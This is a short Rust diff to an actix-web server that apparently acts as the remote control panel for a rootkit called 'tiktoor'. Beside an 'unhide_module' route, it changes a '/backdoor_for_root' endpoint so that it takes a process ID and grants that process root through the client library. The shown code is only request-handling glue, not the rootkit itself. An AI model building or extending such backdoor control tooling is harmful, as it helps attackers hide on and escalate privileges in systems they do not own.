@@ -67,9 +67,14 @@ async fn unhide_module() -> impl Responder {
     HttpResponse::Ok()
 }
 
+#[derive(Deserialize)]
+struct BackdoorForRootParameter {
+    pid: u32,
+}
+
 #[post("/backdoor_for_root")]
-async fn backdoor_for_root() -> impl Responder {
-    tiktoor_client::backdoor_for_root();
+async fn backdoor_for_root(parameter: web::Json<BackdoorForRootParameter>) -> impl Responder {
+    tiktoor_client::backdoor_for_root(parameter.pid);
     HttpResponse::Ok()
 }
 
